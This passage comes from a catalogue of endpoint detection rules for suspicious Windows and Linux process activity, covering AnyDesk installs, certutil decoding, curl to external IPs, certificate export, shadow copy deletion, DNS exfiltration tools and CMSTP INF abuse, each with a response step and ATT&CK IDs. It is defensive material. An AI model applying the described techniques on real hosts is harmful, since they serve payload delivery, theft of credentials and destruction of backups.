Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


</details>



<details>
<summary>Suspicious Process - Anydesk Installed From Unusual Location</summary>



#### Description

This detection identifies the Anydesk remote access software being installed from an unusual location. Malicious actors have been observed installing Supremo for remote access after they have gained an initial foothold on a system. 

#### Recommendation

Determine whether Supremo was installed on this host by the user or by an authorized IT employee. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - AnyDesk Installed Via PowerShell</summary>



#### Description

This detection identifies AnyDesk remote access software being installed by PowerShell. Malicious actors have been observed installing and using AnyDesk as a means of remote access to a system.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - Apache Launches Wget or Curl</summary>



#### Description

This detection identifies an Apache process launching Curl or Wget. This may be done by a malicious actor who has compromised a web server in order to download additional malware.

#### Recommendation

Investigate the URL that is being contacted and whether or not it has a legitimate business use. If this activity is not benign or expected, consider rebuilding the host from a known, good source.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Web Shell - T1505.003


</details>



<details>
<summary>Suspicious Process - Appcmd.exe Creating Virtual Directory Pointing To ProgramData</summary>



#### Description

This detection identifies the 'appcmd.exe' utility being used to create a virtual directory that links a directory in the IIS web directory to the ProgramData directory. ProgramData is a common staging directory for malicious actors. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having any potentially effected users change their password.

#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Atera Agent Registration</summary>



#### Description

This detection identifies installation and registration of the Atera RMM agent using an email address from a free email service. Conti adversaries have been observed using Atera, a legitimate remote management solution, for command and control of hosts. The actor registers the Atera install to a burner email address hosted by free email services like GMail, Yahoo, etc. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - Attempted Timestomping via PowerShell</summary>



#### Description

This detection identifies PowerShell being used to modify the timestamps of a file. Malicious actors may do this to hinder forensic analysis. 

#### Recommendation

Investigate the file whose timestamps are being changed. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Timestomp - T1070.006


</details>



<details>
<summary>Suspicious Process - Base64-Encoded PE File In Command Line Arguments</summary>



#### Description

This detection identifies the encoded version of the first 16 bytes of a Windows Portable Executable file header in the command line. Malicious actors use this technique to obfuscate malicious payloads as they are passed to the system for execution, or to be written to disk.


#### Recommendation

Attempt to decode the base64 and analyze the resulting executable file. Inspect the rest of the command containing the base64 text to determine what it does with the executable. It may be written to disk, or it may be loaded directly into memory. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Suspicious Process - Base64-Encoded RAR File In Command Line Arguments</summary>



#### Description

This detection identifies the first eight bytes of a RAR file header encoded in base64. Malicious actors do this to obfuscate the file and potentially evade detection.


#### Recommendation

If possible, decode and examine the RAR file. Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Base64-Encoded Zip File In Command Line Arguments</summary>



#### Description

This detection identifies the first eight bytes of a Zip file header encoded in base64. Malicious actors do this to obfuscate the file and potentially evade detection.


#### Recommendation

If possible, decode and examine the Zip file. Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - bi1 File in Command Line, Possible Ursnif Activity</summary>



#### Description

This detection identifies files in the command line with a ‘.bi1’ file extension. The ‘URSNIF’ family of malware, also known as ‘Gozi’ or ‘Vawtrack’, will often write data to disk as a file with a ‘.bi1’ file extension.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Suspicious Process - Binary Executed From Or Spawned By Terminal Service Share</summary>



#### Description

This detection identifies processes executed from or spawned by binaries located on the terminal services share,\\tsclient\<DRIVELETTER>\. Malicious actors may use this to deploy a payload from their terminal services client to the host they are accessing.

#### Recommendation

Review the RDP authentications to this system for anomalies. Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - Binary On Remote IP Share</summary>



#### Description

This detection identifies binaries that are executed from an SMB share with a routable IP address. 

#### Recommendation

Investigate the remote IP address and whether it has a known business use. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - BitDefender Installer Runs Executable</summary>



#### Description

Identifies BitDefender being used to proxy the execution of another binary. The executable may still have a recognizable BitDefender name, or it may be renamed to evade detection.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - BitsArbitraryFileMove Exploit</summary>



#### Description

This detection identifies possible exploit of CVE-2020-0787,  a vulnerability in the Background Intelligent Transfer Service (BITS) service, which will overwrite C:\Windows\System32\WindowsCoreDeviceInfo.dll with a DLL of the malicious actor's choosing. 

#### Recommendation

Investigate the file C:\Windows\System32\WindowsCoreDeviceInfo.dll . Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Suspicious Process - Boot Configuration Data Editor Activity</summary>



#### Description

This detection identifies the use of the Boot Configuration Data Editor, ‘BCEdit.exe’, to disable the automatic startup repair for the disk. This technique is used by malicious actors to stop the Operating System from repairing itself, and is a form of ransomware.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Inhibit System Recovery - T1490
- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Suspicious Process - Browser Spawns Executable From Users Temp</summary>



#### Description

This detection identifies child processes started by common browsers from a user's temporary folder. This may indicate a drive-by download or other malicious web activity that has resulted in a malicious binary being downloaded and executed.

#### Recommendation

Examine the binary that was downloaded and executed. Use web proxy logs or browser history data to determine the source of the binary. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Drive-by Compromise - T1189


</details>



<details>
<summary>Suspicious Process - Browser Spawns Scripting Engine</summary>



#### Description

This detection identifies scripting engines spawned by browser processes. This tactic has been used by drive-by exploit kits and malicious actors.

#### Recommendation

Investigate the command that is being run in the scripting engine. Review browser history for signs of abnormal behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203
- Malicious Link - T1204.001


</details>



<details>
<summary>Suspicious Process - burpcollaborator.net in CommandLine</summary>



#### Description

This detection identifies the use of Burp Collector. Burp Collaborator is a tool designed for web application testing, and has been used by malicious actors. 

#### Recommendation

Determine whether this is part of authorized administrator or security testing activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203


</details>



<details>
<summary>Suspicious Process - Cacls With Deny Flag</summary>



#### Description

This detection identifies ‘Cacls.exe’, a Windows utility for controlling access to files and folders, being used to deny access to specific users. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Suspicious Process - Caret Obfuscation</summary>



#### Description

This detection identifies commands being executed with a suspicious number of caret characters in the command line. This is used by malicious actors as a method of breaking up strings to evade content-based detections. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Suspicious Process - C:\Datop\ in Command Line</summary>



#### Description

This detection identifies the directory C:\Datop when it appears in command line arguments. This directory is a common staging location for malicious actors and is associated with the SquirrelWaffle malware family. 

#### Recommendation

Investigate the contents of the C:\Datop directory. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Certificate Exported via Command Line</summary>



#### Description

This detection identifies PowerShell or certutil being used to export certificates on Windows.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and revoking the exported certificates.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Private Keys - T1552.004


</details>



<details>
<summary>Suspicious Process - CertUtil Decodes Executable File</summary>



#### Description

This detection identifies the 'CertUtil.exe' utility being used to decode files with an executable (.exe) file extension. Malicious actors may download encoded files to evade detection, and use 'CertUtil.exe' to decode them and write them to the directory where they will be executed. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything else that it may have spawned. Investigate the .exe file that was written to. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - CertUtil Executing To Encode Data</summary>



#### Description

This detection identifies the use of the CertUtil process to encode data in order to perform data exfiltration. This behaviour was seen in Babyshark malware family.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Encoding - T1132


</details>



<details>
<summary>Suspicious Process - CertUtil With Flags Verifyctl and Split</summary>



#### Description

This detection identifies the use of ‘certutil.exe’ with the flags ‘-verifyctl’ and ‘-split’ being passed to the Windows command line certificate services tool. This technique is used by malicious actors to download additional payloads. A malicious actor could use a built-in tool in a non-standard way to avoid detection.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - Child of CHCP</summary>



#### Description

This detection identifies processes being created by CHCP.exe. A malicious actor can set a value in the registry and cause a malicious DLL to be loaded whenever a certain code page is set with CHCP.exe. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - Child Of cmstp.exe</summary>



#### Description

This detection identifies child processes of ‘cmstp.exe’, the Microsoft Connection Manager Profile Installer. This is an application whitelisting bypass technique similar to ‘squiblydoo’.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Suspicious Process - Child of ConHost</summary>



#### Description

This detection identifies suspicious child processes of 'conhost.exe'. This process is responsible for managing console windows on Windows, and is always running. This makes it a good target for process injection, or for process masquerading. On certain versions of Windows, 'conhost.exe' can also be used as a command interpreter itself, and it will take commands as if it were 'cmd.exe'. A malicious actor may use this instead of 'cmd.exe' to run commands in a way that will bypass detections based on 'cmd.exe' activity.

#### Recommendation

Investigate all processes spawned by 'conhost.exe', and any processes that those processes may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - Child Of Remote Process</summary>



#### Description

This detection identifies child processes of binaries from remote SMB shares running on a host. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - Child Of ScrCons</summary>



#### Description

This detection identifies child processes of ‘ScrCons.exe’. Malicious actors use ‘ScrCons.exe’ to launch processes.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Suspicious Process - Child of SearchProtocolHost.exe</summary>



#### Description

This detection identifies suspicious subprocesses of SearchProtocolHost.exe, a common target for process injection. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - Child Of SVCHost With Flags -k TSGateway</summary>



#### Description

This detection identifies the child processes of ‘svchost.exe’ with the ‘-k tsgateway’ arguments being passed to it through the command line. This process could indicate that a malicious actor is exploiting the remote code execution vulnerability in Windows Remote Desktop Gateway (RD Gateway), which is tracked as CVE-2020-0609 in MITRE’s Common Vulnerabilities and Exposures system.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploit Public-Facing Application - T1190
- Exploitation of Remote Services - T1210
- Obtain Capabilities - T1588
- Exploits - T1588.005


</details>



<details>
<summary>Suspicious Process - Child Process Of 7zip or WinRar</summary>



#### Description

This detection identifies child processes of compression programs, such as 7zip or WinRar. Emails will often use compressed archives to deliver payloads to endpoints. Some of these compressed archives are password protected.

#### Recommendation

Examine the archive that was being opened, and the process it spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - Child Process Spawned by Binary in Recycle Bin</summary>



#### Description

This detection identifies a suspicious child process spawned by an executable running out of recycle bin, a typical staging directory for malicious actors. It is not typical for any legitimate executables to run out of the root of the recycle bin directory, more so spawning other processes. 



#### Recommendation

Review the process activity on the host to identify other suspicious behavior. Retrieve the binary in question and perform analysis on its behavior if the hash is unknown. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Suspicious Process - cmd.exe Starts Process From Remote SMB Share</summary>



#### Description

This detection identifies ‘cmd.exe’ starting a process from a remote SMB share. Malicious actors may mount SMB shares under their control,  and use it to deploy malware.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - cmd /k type</summary>



#### Description

This detection identifies the use of the' cmd /k', 'type', and 'find' commands together. Malicious actors use this tactic to retrieve and execute code from environment variables.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - cmstp.exe with /s flag</summary>



#### Description

This detection identifies the use of ‘cmstp.exe’ with the /s flag.CMSTP, or the Microsoft Connection Manager Profile Installer, which can be used to load malicious INF scripts, DLLs, and COM scriptlets. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Suspicious Process - cmstp.exe with /s /ns or /s /ni flags</summary>



#### Description

This detection identifies the use of ‘cmstp.exe’ with the /s /s /ns or /s /ni flags.CMSTP, or the Microsoft Connection Manager Profile Installer, which can be used to load malicious INF scripts, DLLs, and COM scriptlets. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Suspicious Process - CMSTP Loads .inf File</summary>



#### Description

This detection identifies the use of CMSTP to load an INF file. Malicious actors can use INF files to fetch SCT files from web resources and execute COM scripts/scriptlets using ‘cmstp.exe’, which is a utility that is able to bypass UAC and AppLocker default policies. For reference, basic usage for ‘cmstp.exe’ is as follows:

cmstp.exe /s [file].inf

Within the source INF file used for remote SCT execution, ‘cmstp.exe’ calls the INF section named ‘DefaultInstall_SingleUser’. Under this section, the OCX unregister directive, UnRegisterOCXs, calls the UnRegisterOCXSection to perform the ‘malicious’ action of invoking scrobj.dll to fetch and run the SCT script file.

#### Recommendation

Acquire the INF file that is being installed and analyze for suspicious contents in the DefaultInstall_SingleUser and UnRegisterOCX sections. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Suspicious Process - ColdFusion Webserver Spawns Shell Process</summary>



#### Description

This detection identifies shell processes such as 'cmd.exe' or bash being spawned by a ColdFusion process. Suspicious processes launched by ColdFusion may indicate a compromise of the web server.

#### Recommendation

Investigate the command being run and attempt to determine their purpose. Look for signs of further activity from a potential malicious actor, such as host or network discovery commands being executed, as these often precede attempts at lateral movement. 

#### MITRE ATT&CK Techniques

- Web Shell - T1505.003


</details>



<details>
<summary>Suspicious Process - Common Code Injection Commands in Command Line</summary>



#### Description

This detection identifies obfuscated commands in PowerShell that are commonly used by malicious actors to inject malicious shellcode or DLLs.

#### Recommendation

Attempt to decode and examine any base64 encoded commands. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Process Injection - T1055
- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - copy.exe Concatenating Binaries</summary>



#### Description

This detection identifies a defense evasion tactic in which two seemingly benign files are concatenated into one malicious file, which is then executed. This tactic is commonly used by adware and  spyware.


#### Recommendation

Identify the parent process of the file concatenation, and search for hashes in public malware databases to determine if it is known adware. Analyze process activity before and after concatenation. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Suspicious Process - Copying cmd.exe or PowerShell Binaries</summary>



#### Description

This detection identifies ‘xcopy.exe’ or ‘cp.exe’ being used to create a copy of ‘cmd.exe’ or PowerShell. Malicious actors may create their own copy of these programs rather than use the one in the default install location.


#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - Covenant C2 Commands</summary>



#### Description

This detection identifies commands commonly observed in activity related to Covenant, a popular C2 framework.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Creating a Service DLL with Reg.exe</summary>



#### Description

This detection identifies reg.exe being used to set up a service DLL by modifying the contents of a registry key that corresponds to a certain service. The registry key being modified is HKLM\SYSTEM\CurrentControlSet\Services\<service name>\Parameters

#### Recommendation

Investigate the DLL file that is added as a service DLL. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- System Services - T1569


</details>



<details>
<summary>Suspicious Process - CSC.exe Possible Compile and Execute In Memory</summary>



#### Description

This detection identifies ‘CSC.exe’ being used to compile and execute code. ‘CSC.exe’, the Microsoft .NET C# compiler, is used by malicious actors to compile and execute malicious C# code.

#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Compile After Delivery - T1027.004
- Trusted Developer Utilities Proxy Execution - T1127


</details>



<details>
<summary>Suspicious Process - CScript.exe running PubPrn.vbs, Possible Remote Script Execution</summary>



#### Description

This detection identifies ‘CScript.exe’ being used to run the PubPrn.vbs script. Malicious actors can use the trusted PubPrn.vbs Microsoft file to execute scripts from a remote host.


#### Recommendation

Investigate the script in the command line arguments, the remote host the script was executed from, and any child processes created.

#### MITRE ATT&CK Techniques

- PubPrn - T1216.001


</details>



<details>
<summary>Suspicious Process - CScript, WScript Spawns Process From Users Temp or Roaming Directory</summary>



#### Description

This detection identifies CScript or WScript spawning child processes whose binary is located within the Users directory. This occurs when malicious actors drop payloads to disk in the user-writable Users directory and then invoke the script that performs the malware drop.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Visual Basic - T1059.005
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - ctfmon.exe in Non-Standard Location</summary>



#### Description

This detection identifies the binary 'ctfmon.exe' in a suspicious location. Malicious actors commonly attempt to disguise malware as legitimate Windows system binaries. Often these can be detected if a Windows system binary name is observed in an odd location.

#### Recommendation

Examine the commandline arguments of the renamed program for malicious indicators. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Curl Passed Jenkins URL Environment Variable</summary>



#### Description

This detection identifies 'curl' making requests with 'JENKINS_URL=' being passed in either plaintext or hexidecimal encoded formats. This has been observed being used by malicious actors post compromise of Jenkins servers.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - Curl to External IP Address</summary>



#### Description

This detection identifies the Curl utility being used to access a remote IP address. Malicious actors often use utilities, such as Curl to download additional payloads after gaining access to a target resource.

#### Recommendation

Examine the IP address that is being contacted. Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process: C:\Windows\Help\Help Directory</summary>



#### Description

This detection identifies the C:\Windows\Help\Help\ directory being used as a staging directory for malicious payloads.

#### Recommendation

Examine the contents of the directory. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Default Exploitation Framework DLL Functions</summary>



#### Description

This detection identifies the default function names of various exploitation frameworks being run by rundll32.exe. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Delete Catalog Passed To WBAdmin</summary>



#### Description

This detection identifies the command ‘delete catalog’ being passed to the Windows Backup Administrative utility, ‘wbadmin.exe’. This command destroys the catalog of backups created by the Windows Server Backup snap-in. This technique is used by malicious actors deploying ransomware to increase the likelihood of a target paying the ransom.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Destruction - T1485
- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - Delete File Shadow Copies With PowerShell</summary>



#### Description

This detection identifies the use of ‘PowerShell.exe’ to delete any shadow copies of files on disk. This technique is used by malicious actors during a ransomware attack to destroy backup copies of files on a system to increase the likelihood of a target paying to retrieve their data. Other legitimate software may use this to minimize disk usage.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Data Destruction - T1485
- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - DelNodeRunDLL32 Function Executed</summary>



#### Description

This detection identifies the DelNodeRunDLL32 function from the advpack.dll library being used to execute a DLL.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Disable Network Level Auth via PowerShell</summary>



#### Description

This detection identifies PowerShell being used to disable network level authentication by using the  "SetUserAuthenticationRequired(0)" function from the Win32_TSGeneralSetting WMI object. Malicious actors may use this to force accounts to authenticate locally. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. Ensure that this is part of authorized administrator activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Local Accounts - T1078.003


</details>



<details>
<summary>Suspicious Process - Discord CDN URL in Command Line</summary>



#### Description

This detection identifies a Discord Content Distribution Network URL in the command line arguments of a process that is not the Discord chat client.

#### Recommendation

Investigate the file that is hosted at the Discord URL. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Web Service - T1102
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - DLL Added to Service via Registry Edit</summary>



#### Description

This detection identifies Reg.exe being used to add a service DLL to a service. This may be done by malicious actors who are setting up malicious services. 

#### Recommendation

Investigate the service DLL that is added. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- System Services - T1569


</details>



<details>
<summary>Suspicious Process - DLL Executing Powershell Deobfuscation Commands</summary>



#### Description

This detection identifies PowerShdll being used to run PowerShell commands by loading a DLL rather than running the ‘PowerShell.exe’ executable. It can be loaded with built-in Windows utilities, including ‘Rundll32.exe’, ‘regasm.exe’, ‘regsvcs.exe’, ‘InstallUtil.exe’, and ‘regsvr32.exe’. The code for PowerShdll can be found at https://github.com/p3nt4/PowerShdll

#### Recommendation

Attempt to deobfuscate any obfuscated PowerShell script. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001
- InstallUtil - T1218.004
- Regsvcs/Regasm - T1218.009
- Regsvr32 - T1218.010
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - DLLHost With No Arguments Spawns Process</summary>



#### Description

This detection identifies 'DLLHost.exe' with no arguments spawning a child process. This may be indicative of a process masquerading as DLLHost, or it may indicate that DLLHost was injected into. 

#### Recommendation

Examine the process that was spawned by DLLHost, and validate whether DLLHost is the expected Windows binary. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - [d.m]::run() in Command Line</summary>



#### Description

This detection identifies the string '[d.m]::run()' being passed in command line arguments. This is indicative of certain PowerShell-based malware.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - DNScmd DLL Loading DLL</summary>



#### Description

This detection identifies the DNScmd Domain Controller utility being used to load a DLL. Malicious actors use this to run malicious code with SYSTEM privileges. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Acquire and analyze the loaded DLL.

#### MITRE ATT&CK Techniques

- Services Registry Permissions Weakness - T1574.011


</details>



<details>
<summary>Suspicious Process - DNS Exfiltration Utilities</summary>



#### Description

This detection identifies DNS exfiltration utilities Iodine and DNScat2 being used to exfiltrate data via DNS.


#### Recommendation

Ensure that the activity is not part of authorized testing. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- DNS - T1071.004


</details>



<details>
<summary>Suspicious Process - DNS Spawns Process</summary>



#### Description

This detection identifies processes spawned by ‘dns.exe’ from Microsoft’s Domain Name System (DNS) server binary. This technique is used by malicious actors to perform remote command execution.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

